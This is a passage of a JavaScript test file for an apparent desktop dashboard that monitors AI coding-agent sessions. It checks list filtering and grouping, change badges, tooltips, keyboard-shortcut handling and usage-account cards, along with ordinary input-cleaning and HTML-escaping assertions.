  {...item({id: 'g5', title: 'Reply bounced', kind: 'question', project: 'atlas', project_name: 'Atlas', session_id: 'claude:c', session_name: 'Release planner', status: 'answered', bucket: 'waiting', delivery: 'failed', minutes: 1, created: now - 300}), lane: 'agents'},
];
const G = (code) => run(`(() => {const f = cleanNeeds(null, 'none'); ${code}})()`);
assert.deepEqual(Array.from(G('return needsYou(gBase).map((i) => i.id)')), ['g1', 'g2', 'g3', 'g4', 'g5']); // a failed reply needs you again
assert.deepEqual(Array.from(G('return narrowNeeds(gBase, f).map((i) => i.id)')), ['g2', 'g3', 'g1', 'g4', 'g5']); // smart: pinned, due, then priority
assert.deepEqual(Array.from(G("f.order = 'newest'; return narrowNeeds(gBase, f).map((i) => i.id)")), ['g5', 'g1', 'g2', 'g3', 'g4']);
assert.deepEqual(Array.from(G("f.order = 'oldest'; return narrowNeeds(gBase, f).map((i) => i.id)")), ['g4', 'g3', 'g2', 'g1', 'g5']);
assert.deepEqual(Array.from(G("f.order = 'quick'; return narrowNeeds(gBase, f).map((i) => i.id)")), ['g1', 'g5', 'g2', 'g4', 'g3']);
// Views and their counts, with the search applied.
const viewIds = (view) => Array.from(G(`f.view = '${view}'; return narrowNeeds(gBase, f).map((i) => i.id)`));
assert.deepEqual(viewIds('decision'), ['g2', 'g4', 'g5']);
assert.deepEqual(viewIds('failed'), ['g5']);
assert.deepEqual(viewIds('pinned'), ['g2']);
assert.deepEqual(viewIds('quick'), ['g2', 'g1', 'g5']);
assert.deepEqual(viewIds('due'), ['g3']);
assert.deepEqual(viewIds('project:harbor'), ['g2', 'g3']);
assert.deepEqual(viewIds('agent:codex:a'), ['g3', 'g1']);
assert.deepEqual(Array.from(G("f.q = 'deploy watcher'; return narrowNeeds(gBase, f).map((i) => i.id)")), ['g3', 'g1']); // search reaches agents and places
assert.deepEqual(Array.from(G("f.q = 'launch harbor'; return narrowNeeds(gBase, f).map((i) => i.id)")), ['g2']); // every word must match
let pop = G("f.open = 'view'; f.q = 'the'; return needsPopHTML(f, gBase)");
assert.ok(pop.includes('data-v="decision" role="menuitemradio" aria-checked="false"><span class="tick"></span><span class="o-text">Decisions</span><span class="n">2</span>'));
assert.ok(pop.includes('By project') && pop.includes('data-v="project:atlas"') && pop.includes('By agent') && pop.includes('data-v="agent:claude:c"'));
// Groups, each in its own order, and the order holding inside each group.
const groupsOf = (group) => JSON.parse(G(`f.group = '${group}'; return JSON.stringify(needsGroups(narrowNeeds(gBase, f), f, gBase).map((x) => [x.name, x.rows.map((i) => i.id)]))`));
assert.deepEqual(groupsOf('project'), [['Atlas', ['g4', 'g5']], ['Harbor', ['g2', 'g3']], ['Lantern', ['g1']]]);
assert.deepEqual(groupsOf('kind'), [['Blockers', ['g1']], ['Decisions', ['g2', 'g4', 'g5']], ['Actions', ['g3']]]);
assert.deepEqual(groupsOf('due').map((x) => x[0]), ['Today', 'No due date']);
assert.deepEqual(groupsOf('agent'), [['Deploy watcher', ['g3', 'g1']], ['Release planner', ['g2', 'g4', 'g5']]]);
// Folds belong to each grouping; ⌥-click folds or opens them all; Only this narrows to one.
html = G(`f.group = 'project'; needsAct(f, 'fold', {dataset: {v: 'harbor'}}, {}, gBase); return needsBodyHTML(f, gBase, (i) => '<row ' + i.id + '>', () => '')`);
assert.ok(html.includes('class="gh shut" data-g="fold" data-v="harbor"') && !html.includes('<row g2>') && html.includes('<row g4>'));
assert.deepEqual(JSON.parse(G(`f.group = 'project'; needsAct(f, 'fold', {dataset: {v: 'harbor'}}, {}, gBase); f.group = 'kind'; return JSON.stringify([foldsOf(f).size, f.folds.project])`)), [0, ['harbor']]);
assert.equal(G(`f.group = 'project'; needsAct(f, 'fold', {dataset: {v: 'atlas'}}, {altKey: true}, gBase); return foldsOf(f).size`), 3); // ⌥-click on an open group folds all
assert.equal(G(`f.group = 'project'; needsAct(f, 'foldall', {dataset: {}}, {}, gBase); needsAct(f, 'foldall', {dataset: {}}, {}, gBase); return foldsOf(f).size`), 0); // the header toggle opens them again
assert.deepEqual(Array.from(G(`f.group = 'kind'; needsAct(f, 'only', {dataset: {v: 'question', name: 'Decisions'}}, {}, gBase); return narrowNeeds(gBase, f).map((i) => i.id)`)), ['g2', 'g4', 'g5']);
html = G(`f.group = 'kind'; needsAct(f, 'only', {dataset: {v: 'question', name: 'Decisions'}}, {}, gBase); return needsHeadHTML(f, gBase)`);
assert.ok(html.includes('<b>3</b> of 5') && html.includes('Only Decisions') && html.includes('data-g="clear">Clear'));
assert.ok(!G('return needsHeadHTML(f, gBase)').includes('g-tally')); // nothing narrowed, no tally
assert.ok(G('return needsHeadHTML(f, gBase)').includes('<span class="h">Needs you</span><span class="count">5</span>'));
assert.equal(G(`f.view = 'failed'; f.q = 'x'; f.only = {group: 'kind', v: 'todo', label: 'Actions'}; needsAct(f, 'clear', {dataset: {}}, {}, gBase); return JSON.stringify([f.view, f.q, f.only])`), '["all","",null]');
// Kept per tab, without the search text; anything odd in storage starts clean.
assert.deepEqual(JSON.parse(G(`f.q = 'secret words'; f.view = 'pinned'; return JSON.stringify(keptNeeds(f))`)), {view: 'pinned', order: 'smart', group: 'none', folds: {}, only: null});
const cleaned = JSON.parse(run(`JSON.stringify(cleanNeeds({view: '<script>', order: 'random', group: 'colour', folds: {project: ['harbor', 42], kind: 'nope'}, only: {group: 'kind', v: 'todo'}}, 'none'))`));
assert.deepEqual([cleaned.view, cleaned.order, cleaned.group, cleaned.folds, cleaned.only], ['all', 'smart', 'none', {project: ['harbor']}, {group: 'kind', v: 'todo', label: 'todo'}]);
assert.equal(run("cleanNeeds({view: 'project:harbor'}).view"), 'project:harbor');
assert.equal(run("cleanTabs({tabs: {needs: {filter: {group: 'agent', view: 'due'}}}}).tabs.needs.filter.group"), 'agent');

// Change marks: a signed badge for two minutes after a run of changes (a burst nets into one),
// then a dot until the list is opened; hover lists the last few. Amber is more, green fewer.
assert.equal(run("signedDelta(3)"), '+3');
assert.equal(run("signedDelta(-1)"), '−1');
assert.equal(run("signedDelta(0)"), '±0');
assert.equal(run("signedDelta(-8, '%')"), '−8%');
assert.deepEqual(['needs', 'stuck', 'agents', 'claude'].map((m) => [run(`markTone('${m}', 2)`), run(`markTone('${m}', -2)`)]),
  [['more', 'fewer'], ['more', 'fewer'], ['same', 'same'], ['fewer', 'more']]); // usage going down is the worse way
run(`markLog = []; marks.log = markLog; recordMarks([{group: 'items', metric: 'needs', delta: 1, title: 'Choose the launch date'},
  {group: 'items', metric: 'needs', delta: 1, title: 'Pick a subject line'}, {group: 'items', metric: 'decisions', delta: 1, title: 'not a marked circle'},
  {group: 'usage', metric: 'claude', delta: 0, title: 'no change'}], 1000);
  recordMarks([{group: 'items', metric: 'needs', delta: 1, title: 'Review the release notes'}], 1030);
  recordMarks([{group: 'items', metric: 'needs', delta: -1, title: 'Approve the certificate'}], 1100)`);
assert.equal(run('marks.log.length'), 4); // only circles that mark, and only real changes
const markAt = (now, seen = 0, wanted = '') => JSON.parse(run(`JSON.stringify(markOf(marks.log, 'needs', ${seen}, ${now}${wanted}))`));
let m = markAt(1110);
assert.deepEqual([m.kind, m.text, m.tone, m.opacity], ['badge', '+2', 'more', 1]); // +1 +1 +1 −1 nets to +2, amber
m = markAt(1100 + 105);
assert.ok(m.kind === 'badge' && m.opacity > 0.4 && m.opacity < 0.6); // fades over its last 30 seconds
m = markAt(1100 + 121);
assert.deepEqual([m.kind, m.tone], ['dot', 'more']); // then a dot, coloured by the net since you looked
assert.equal(markAt(1100 + 3600).kind, 'dot'); // the dot waits for you, however long
assert.equal(markAt(1110, 1110), null); // opening the list clears both
m = markAt(1110, 1000 + 1);
assert.deepEqual([m.text, m.tone], ['±0', 'same']); // only what came after you looked: +1 then −1
assert.equal(markAt(1110, 0, ", (e) => e.group !== 'items'"), null); // off in Notify me about, nothing marks
run(`recordMarks([{group: 'items', metric: 'needs', delta: -1, title: 'Upload the signed file'}], 1400)`);
m = markAt(1410);
assert.deepEqual([m.kind, m.text, m.tone], ['badge', '−1', 'fewer']); // a new run starts after two quiet minutes
// Hover: what happened, since when, and the last three with their times.
const hist = JSON.parse(run('JSON.stringify(markHistory(marks.log, "needs", 1410))'));
assert.ok(/^3 added, 2 done since \d{1,2}:\d{2}/.test(hist.summary), hist.summary);
assert.deepEqual(hist.list.map((e) => [e.text, e.tone, e.label]), [['−1', 'fewer', 'Upload the signed file'], ['−1', 'fewer', 'Approve the certificate'], ['+1', 'more', 'Review the release notes']]);
assert.equal(run('markHistory(marks.log, "agents", 1410)'), null);
assert.equal(run('JSON.stringify(markHistory(marks.log, "needs", 1000 + 601 + 400))'), JSON.stringify(null)); // ten minutes of history
run(`recordMarks([{group: 'usage', metric: 'claude', delta: -3, title: 'Claude is nearly out'}], 1500)`);
assert.equal(JSON.parse(run('JSON.stringify(markOf(marks.log, "claude", 0, 1510))')).text, '−3%');
assert.ok(run('markHistory(marks.log, "claude", 1510).summary').startsWith('3% used since'));
// The panel's own tooltips: words, then a key hint after two spaces; below the control, above
// near the bottom, beside it when neither fits, and always inside the visible area.
assert.deepEqual(JSON.parse(run(`JSON.stringify(tipParts('Fold all groups  ⌥←'))`)), {label: 'Fold all groups', key: '⌥←'});
assert.deepEqual(JSON.parse(run(`JSON.stringify(tipParts('Done'))`)), {label: 'Done', key: ''});
const tipArea = {x: 0, y: 33, width: 1728, height: 994};
const tipAt = (r) => JSON.parse(run(`JSON.stringify(placeTip(${JSON.stringify(r)}, {width: 120, height: 26}, ${JSON.stringify(tipArea)}))`));
assert.deepEqual(tipAt({left: 600, right: 632, top: 300, bottom: 332, width: 32, height: 32}), {x: 556, y: 338}); // centred below
assert.deepEqual(tipAt({left: 600, right: 632, top: 990, bottom: 1022, width: 32, height: 32}), {x: 556, y: 958}); // no room below: above
assert.deepEqual(tipAt({left: 1690, right: 1722, top: 300, bottom: 332, width: 32, height: 32}), {x: 1604, y: 338}); // kept off the right edge
assert.deepEqual(tipAt({left: 600, right: 640, top: 40, bottom: 1020, width: 40, height: 980}), {x: 646, y: 517}); // neither: beside it
// The agents circle: who is running, newest first, five at most and "+N more"; none, the last to finish.
run(`savedSessions = state.sessions; state.sessions = ['a', 'b', 'c', 'd', 'e', 'f', 'g'].map((n, at) => ({id: 'r:' + n, name: 'Run ' + n, provider: at % 2 ? 'codex' : 'claude-code', cwd: '/x', last_active: ${clockNow},
  activity: {state: 'active', source: at === 2 ? 'background' : 'live', since: ${clockNow} - (at + 1) * 600}})); model = derive()`);
html = run('spotHTML("agents")');
assert.deepEqual([...html.matchAll(/<span class="n" aria-hidden="true">([^<]+)<\/span>/g)].map((m) => m[1]), ['Run a', 'Run b', 'Run c', 'Run d', 'Run e']);
assert.ok(html.startsWith('<b>7 agents running</b>') && html.includes('<span class="f-spot-more">+2 more</span>'));
assert.ok(html.includes('<small aria-hidden="true">Claude · 10m</small>') && html.includes('<small aria-hidden="true">Claude · ↻ 30m</small>') && html.includes('<small aria-hidden="true">Codex · 40m</small>'));
assert.ok(html.includes('aria-label="Run a, Claude Code, running 10m"') && html.includes('aria-label="Run c, Claude Code, in the background 30m"')); // full words for VoiceOver
assert.ok(!html.includes('f-spot-rule')); // no history, no hairline
run(`recordMarks([{group: 'agents', metric: 'agents', delta: 1, title: 'Run a started'}])`);
assert.ok(run('spotHTML("agents")').includes('+2 more</span><span class="f-spot-rule" aria-hidden="true"></span><span class="f-spot-sum">1 started since'));
run(`marks.log = []; state.sessions = state.sessions.map((s, at) => ({...s, last_active: ${clockNow} - (at + 1) * 3600, activity: {state: 'idle'}})); model = derive()`);
html = run('spotHTML("agents")');
assert.ok(html.startsWith('<b>No agents running</b><span class="f-spot-sum">Run a finished 1h ago</span>'), html);
run('state.sessions = savedSessions; model = derive()');
// The dot sits inside the circle, before the number, so the number still rolls and the capsule keeps its size.
html = run("circleHTML({value: 164}, 'attention', {kind: 'dot', tone: 'more'})");
assert.ok(html.includes('<span class="f-mark-dot more"></span><span>164</span></span>') && html.includes('wide'));
assert.ok(!run("circleHTML({value: 164}, 'attention', {kind: 'badge', tone: 'more', text: '+3'})").includes('f-mark'));
// Through the pill: five minutes on, the rail carries the dot; a kind turned off in Notify me
// about leaves nothing; open, nothing marks at all.
run(`marks.log = []; marks.seen = 0; recordMarks([{group: 'items', metric: 'needs', delta: 1, title: 'Choose the launch date'}], Date.now() / 1000 - 300)`);
assert.ok(run('pillHTML(attention(), true, markMap())').includes('<span class="f-mark-dot more"></span>'));
assert.ok(run('pillLabel(attention(), true)').includes('1 added since')); // and says so to VoiceOver
run('notify.items = false');
assert.ok(!run('pillHTML(attention(), true, markMap())').includes('f-mark-dot'));
run('notify.items = true; floatOpen = true');
assert.equal(run('Object.keys(markMap()).length'), 0);
run('floatOpen = false; marks.seen = Date.now() / 1000');
assert.ok(!run('pillHTML(attention(), true, markMap())').includes('f-mark-dot')); // seen once opened
assert.ok(run('spotHTML("needs")').includes('<span class="f-spot-sum">1 added since') && run('spotHTML("needs")').includes('Choose the launch date')); // hover still tells
run('marks.log = []; marks.seen = 0');

// An item's source ("worktree · task"): just before the time in Needs you, at the end of the line
// where there is no time, shortened only past 40 characters, and nothing when empty.
const sourced = (source, extra = {}) => ({...item({id: 'src1', title: 'Sourced', created: now - 7200, source, ...extra}), lane: 'you'});
context.srcItem = sourced('noclick5 · Airtable tests');
assert.ok(run("metaHTML(srcItem, {where: true, age: true, kind: true, source: true})").endsWith('<span class="src">noclick5 · Airtable tests</span><span class="sep">·</span>2h ago'));
assert.ok(run("metaHTML(srcItem, {where: true, source: true})").endsWith('<span class="sep">·</span><span class="src">noclick5 · Airtable tests</span>'));
assert.ok(!run("metaHTML(srcItem, {where: true, age: true})").includes('src')); // only where asked for
context.srcItem = sourced('noclick-support-worktree-seven · Reconcile the Stripe webhook retries');
assert.equal(run("sourceText(srcItem)"), 'noclick-support-worktree-seven · Reconc…');
assert.equal(run("sourceText(srcItem)").length, 40);
context.srcItem = sourced('   ');
assert.ok(!run("metaHTML(srcItem, {age: true, source: true})").includes('src'));
// On the item, it shares the crumb line, after the crumbs; none, nothing.
context.srcItem = {...sourced('noclick5 · <Airtable>'), project: 'harbor', project_name: 'Harbor', workstream: 'other', workstream_name: 'Other'};
html = run('detailHTML(srcItem)');
assert.ok(/<div class="crumbs"><span class="c-path">.*Harbor<\/button><\/span><span class="c-src"><span class="sep">·<\/span>noclick5 · &lt;Airtable&gt;<\/span><\/div>/.test(html));
assert.ok(!run("detailHTML({...srcItem, source: ''})").includes('c-src'));

// Several keys per action. One saved key from before becomes a one-key list; null was "none";
// junk and duplicates go, and no key is ever on two actions.
const KH = {keyCode: 4, modifiers: 6144, label: '⌃⌥H'}, KJ = {keyCode: 38, modifiers: 6144, label: '⌃⌥J'}, KX = {keyCode: 7, modifiers: 6144, label: '⌃⌥X'};
Object.assign(context, {KH, KJ, KX});
let keysClean = JSON.parse(run(`JSON.stringify(cleanShortcuts(${JSON.stringify({toggle: KH, next: null, previous: [KX, KX, {keyCode: 'x'}, KJ], dashboard: 'junk'})}))`));
assert.deepEqual(keysClean.toggle, [KH]);
assert.deepEqual(keysClean.next, []); // cleared before stays cleared
assert.deepEqual(keysClean.previous, [KX, KJ]); // duplicates and junk dropped
assert.deepEqual(keysClean.dashboard, [{keyCode: 2, modifiers: 6144, label: '⌃⌥D'}]); // a broken value falls back to the default
assert.deepEqual(keysClean.customize, []);
assert.deepEqual(JSON.parse(run('JSON.stringify(cleanShortcuts())')).next, [KJ]); // nothing saved: the defaults
keysClean = JSON.parse(run(`JSON.stringify(cleanShortcuts(${JSON.stringify({toggle: [KH], next: [KH, KJ]})}))`));
assert.deepEqual([keysClean.toggle, keysClean.next], [[KH], [KJ]]); // one key, one action
// Inside the panel: the defaults are what already worked; one key from before keeps Enter or Escape too.
assert.deepEqual(JSON.parse(run('JSON.stringify(cleanPanelKeys())')), {previous: ['ArrowUp'], next: ['ArrowDown'], open: ['ArrowRight', 'Enter'], back: ['ArrowLeft', 'Escape']});
assert.deepEqual(JSON.parse(run(`JSON.stringify(cleanPanelKeys({previous: 'k', next: 'j', open: 'l', back: null}))`)), {previous: ['k'], next: ['j'], open: ['l', 'Enter'], back: ['Escape']});
assert.deepEqual(JSON.parse(run(`JSON.stringify(cleanPanelKeys({open: ['Enter', 'Enter', '', 7], back: ['Enter', 'h']}))`)).back, ['h']);
// What the window registers: every key of every action.
assert.deepEqual(JSON.parse(run(`JSON.stringify(hotkeyList({toggle: [KH, KX], next: [KJ], customize: []}))`)),
  [{action: 'toggle', keyCode: 4, modifiers: 6144}, {action: 'toggle', keyCode: 7, modifiers: 6144}, {action: 'next', keyCode: 38, modifiers: 6144}]);
// Modifiers alone (⌃ with left ⌥) are kept and registered like any key, and never match ⌃⌥ with a key.
const KMOD = {keyCode: -1, modifiers: 786465, label: '⌃ + left ⌥'};
assert.deepEqual(JSON.parse(run(`JSON.stringify(cleanShortcuts({toggle: [KH, ${JSON.stringify(KMOD)}]}))`)).toggle, [KH, KMOD]);
assert.deepEqual(JSON.parse(run(`JSON.stringify(hotkeyList({toggle: [${JSON.stringify(KMOD)}]}))`)), [{action: 'toggle', keyCode: -1, modifiers: 786465}]);
assert.equal(run(`sameHotkey(${JSON.stringify(KMOD)}, KH_)`.replace('KH_', JSON.stringify(KH))), false);
// Panel keys find their action in any of its keys.
run(`savedPanelKeys = panelKeys; panelKeys = cleanPanelKeys({open: ['ArrowRight', 'Enter', 'l']})`);
assert.deepEqual(['l', 'Enter', 'ArrowRight', 'Escape', 'q'].map((k) => run(`panelAction('${k}', 'list')`)), ['open', 'open', 'open', 'back', null]);
run('panelKeys = savedPanelKeys');
// Adding, re-recording and removing chips; a key taken by another action moves, never doubles.
let keysNow = JSON.parse(run(`JSON.stringify(placeKey({toggle: [KH], next: [KJ]}, 'toggle', null, ${JSON.stringify(KX)}, sameHotkey))`));
assert.deepEqual(keysNow, {toggle: [KH, KX], next: [KJ]});
keysNow = JSON.parse(run(`JSON.stringify(placeKey({toggle: [KH, KX], next: [KJ]}, 'toggle', 0, ${JSON.stringify(KJ)}, sameHotkey))`));
assert.deepEqual(keysNow, {toggle: [KJ, KX], next: []}); // re-recorded in place, and taken from Next
assert.deepEqual(JSON.parse(run(`JSON.stringify(dropKey({toggle: [KH, KX]}, 'toggle', 0))`)), {toggle: [KX]});
assert.deepEqual(JSON.parse(run(`JSON.stringify(keyOwner({toggle: [KH], next: [KJ]}, ${JSON.stringify({...KJ, label: 'other'})}, sameHotkey))`)), {action: 'next', at: 0});
assert.deepEqual(JSON.parse(run(`JSON.stringify(resetKeys({toggle: [KJ], next: []}, 'next', SHORTCUTS, sameHotkey))`)), {toggle: [], next: [KJ]});
// Recording a key another action has asks first; Move takes it, Cancel leaves both as they were.
run(`savedShortcuts = shortcuts; shortcuts = cleanShortcuts({toggle: [KH], next: [KJ]}); window = {webkit: {messageHandlers: {hq: {postMessage: () => {}}}}};
  recordedKey('global', {action: 'toggle', index: null}, KJ)`);
assert.deepEqual(JSON.parse(run('JSON.stringify(keyConflict)')), {kind: 'global', action: 'toggle', index: null, key: KJ, from: 'next'});
html = run('settingsHTML(attention())');
assert.ok(html.includes('⌃⌥J is used by Next item. Move it here?') && html.includes('data-move-key') && html.includes('data-move-cancel'));
run(`keptRender = render; render = () => {}; moveKey(); render = keptRender`);
assert.deepEqual(JSON.parse(run('JSON.stringify([shortcuts.toggle, shortcuts.next, keyConflict])')), [[KH, KJ], [], null]);
// A key macOS refused shows on its own chip, the others still fine.
run(`refused = ['38:6144']`);
html = run('settingsHTML(attention())');
assert.ok(/<span class="f-chip bad"><button type="button" class="f-cap " data-record="toggle" data-index="1"[^>]*title="In use by another app">⌃⌥J<\/button>/.test(html));
assert.ok(html.includes('<small class="f-key-bad">⌃⌥J is in use by another app</small>') && !/f-chip bad"><button[^>]*data-index="0"/.test(html));
run(`refused = []; shortcuts = savedShortcuts; keyConflict = null; recording = null; delete globalThis.window`);

// The age has its own column on the right, so ages line up; the meta line no longer carries it.
context.agedItem = {...item({id: 'ag1', title: 'Aged', created: now - 7200, source: 'noclick5 · Airtable tests'}), lane: 'you'};
html = run("rowHTML(agedItem, {where: true, age: true, kind: true, source: true})");
assert.ok(html.startsWith('<button class="row aged"') && html.endsWith('<span class="age">2h ago</span></button>'));
assert.ok(/<span class="meta">[^]*noclick5 · Airtable tests<\/span><\/span><span class="age">/.test(html) && !/ ago<\/span><span class="age">/.test(html)); // the source ends the meta now
assert.ok(!run("rowHTML(agedItem, {where: true})").includes('class="age"')); // no age shown, no column
context.agedItem = {...context.agedItem, status: 'answered', followup: {stage: 'delivering', stuck: 'stopped', replied: now - 3 * 86400}};
html = run("rowHTML(agedItem, {stuck: true})");
assert.ok(html.includes('<span class="age">3d ago</span>') && !html.includes('decided'));

// Usage, as Tool cards. The accounts API in its own shape becomes the view's; without it, today's
// single reading per tool is the account signed in now.
const acct = (key, email, plan, extra = {}) => ({key, email, plan, org: '', active: false, saved: true, state: 'ok', added: now - 86400, last_used: null,
  usage: {windows: [{name: '5-hour', left: 60, resets_at: now + 3600}, {name: 'weekly', left: 80, resets_at: now + 5 * 86400}], as_of: now - 120}, ...extra});
context.accountsRaw = {
  claude: {active: 'c1', adding: null, accounts: [acct('c1', 'studio@example.com', 'Max', {active: true}), acct('c2', 'personal@example.com', 'Pro'),
    acct('c3', 'team@example.com', 'Team', {state: 'expired', usage: {windows: [{name: '5-hour', left: 54, resets_at: now + 3000}], as_of: now - 2 * 3600}}),
    acct('c4', 'old@example.com', 'Pro', {state: 'needs sign-in', usage: null})]},
  codex: {active: 'x1', adding: null, running: 2, accounts: [acct('x1', 'work@example.com', 'Plus', {active: true, saved: false}), acct('x2', 'side@example.com', 'Pro')]},
};
let usage = JSON.parse(run('JSON.stringify(usageModel(accountsRaw))'));
assert.equal(usage.live, true);
assert.deepEqual(usage.claude.accounts.map((a) => [a.key, a.active, a.state]), [['c1', true, 'ok'], ['c2', false, 'ok'], ['c3', false, 'expired'], ['c4', false, 'needs sign-in']]);
assert.deepEqual(usage.claude.accounts[0].windows[0], {name: '5-hour', left: 60, resetsAt: now + 3600});
assert.equal(usage.codex.running, 2);
usage = JSON.parse(run(`JSON.stringify(usageModel(null, {claude: {windows: [{name: '5-hour', left: 33, resets_at: ${now + 600}}], as_of: ${now - 60}}}))`));
assert.deepEqual([usage.live, usage.claude.accounts.length, usage.claude.accounts[0].windows[0].left, usage.codex.accounts.length], [false, 1, 33, 0]); // today's reading, no API
// The card: the active one first with Active; the others Use and a remove button; a lapsed login
// offers Sign in again; an expired one keeps its numbers as of when they were read.
html = run("usageCardHTML(usageModel(accountsRaw), 'claude')");
assert.ok(html.includes('<h2>Claude</h2><span class="u-using">uses studio@example.com</span>') && html.includes('<p class="u-note">Every Claude session moves to the one you pick.</p>'));
assert.deepEqual([...html.matchAll(/data-acct="(c\d)"/g)].map((m) => m[1]), ['c1', 'c2', 'c3', 'c4']);
assert.ok(/data-acct="c1">.*Active<\/span><\/div>/.test(html.split('data-acct="c2"')[0]) && !html.split('data-acct="c2"')[0].includes('data-u="ask-remove"'));
assert.ok(html.includes('data-u="use" data-key="c2"') && html.includes('data-u="ask-remove" data-key="c2"'));
assert.ok(html.includes('data-u="again" data-key="c4">Sign in again') && html.includes('<span class="bad">Needs sign-in</span> · its saved login lapsed'));
assert.ok(/data-acct="c3".*As of 2h ago/.test(html) && /data-acct="c3"><div class="u-row"><span class="u-ring\s+dim/.test(html));
assert.ok(html.includes('data-u="add" data-tool="claude"') && html.includes('<span class="u-mini-h">Codex</span><span class="u-using">uses work@example.com · 2 accounts</span>'));
assert.ok(run("usageCardHTML(usageModel(accountsRaw), 'codex')").includes('Open Codex sessions keep the old account until restarted.'));
html = run(`usageCardHTML(usageModel(null, {claude: {windows: [{name: '5-hour', left: 33}], as_of: ${now - 60}}}), 'claude')`);
assert.ok(!html.includes('data-u="use"') && !html.includes('data-u="add"') && html.includes('33% left')); // no API: readings only
// Steps in place: add, waiting with its spinner (browser or Terminal), sign in again, remove.
html = run(`usageCardHTML(usageModel(accountsRaw), 'claude', {kind: 'add', tool: 'claude', key: null, step: 'intro'})`);
assert.ok(html.includes('Add a Claude account') && html.includes('Nothing changes for Claude Code until you switch to it.') && !html.includes('data-u="add"'));
html = run(`usageCardHTML(usageModel(accountsRaw), 'claude', {kind: 'add', tool: 'claude', key: null, step: 'waiting', job: {terminal: true}})`);
assert.ok(html.includes('<span class="u-spin" aria-hidden="true"></span>Waiting for you to sign in…') && html.includes('Finish in the Terminal window HQ opened.'));
html = run(`usageCardHTML(usageModel(accountsRaw), 'claude', {kind: 'add', tool: 'claude', key: 'c4', step: 'intro'})`);
assert.ok(html.includes('Sign old@example.com in again') && html.includes('Claude Code stays signed in as studio@example.com.'));
html = run(`usageCardHTML(usageModel(accountsRaw), 'claude', {kind: 'remove', tool: 'claude', key: 'c2'})`);
assert.ok(html.includes('Remove personal@example.com from HQ?') && html.includes('data-u="remove" data-key="c2"'));
// The notice: the address on the first line in parts (so its name gives way and its domain stays),
// and the second line: Claude's note, or Codex's warning without the words the first line says.
html = run(`usageToastHTML({lead: 'Switched to ', email: 'alexandra@example.com', body: 'Every Claude session moves to it.'}, {label: 'Switch back'})`);
assert.ok(html.includes('<span class="u-t-lead">Switched to </span><span class="u-t-local" data-full="alexandra">alexandra</span><span class="u-t-domain">@example.com</span>') && html.includes('>Switch back</button>'));
const bodies = (tool, reply) => JSON.parse(run(`JSON.stringify(switchedBody('${tool}', ${JSON.stringify(reply)}))`));
assert.deepEqual(bodies('claude', {note: 'Every open Claude session moves to it at its next message'}), ['Every Claude session moves to it.']); // the short form, always
assert.deepEqual(bodies('codex', {warning: 'Switched to side@example.com. Restart the 2 open Codex sessions to use it.'}),
  ['Restart the 2 open Codex sessions to use it.', 'Restart 2 open Codex sessions to use it.', 'Restart 2 Codex sessions to use it.', 'Restart Codex to use it.']);
assert.deepEqual(bodies('codex', {warning: 'Restart the 1 open Codex session to use it.'}).slice(1, 3), ['Restart 1 open Codex session to use it.', 'Restart 1 Codex session to use it.']);
assert.deepEqual(bodies('codex', {warning: null, note: ''}), []);
// Usage is a tab of its own, reached from its circles, keeping the tool you left.
assert.equal(run("pillTarget('claude')"), 'usage');
assert.equal(run("pillTarget('codex')"), 'usage');
assert.equal(run("cleanTabs({tabs: {usage: {tool: 'codex'}}}).tabs.usage.tool"), 'codex');
assert.equal(run("cleanTabs({tabs: {usage: {tool: '<x>'}}}).tabs.usage.tool"), 'claude');

console.log('UI lanes, grouping, conversation isolation, presence, stale-update, escaping, draft, floating panel and lab checks passed');
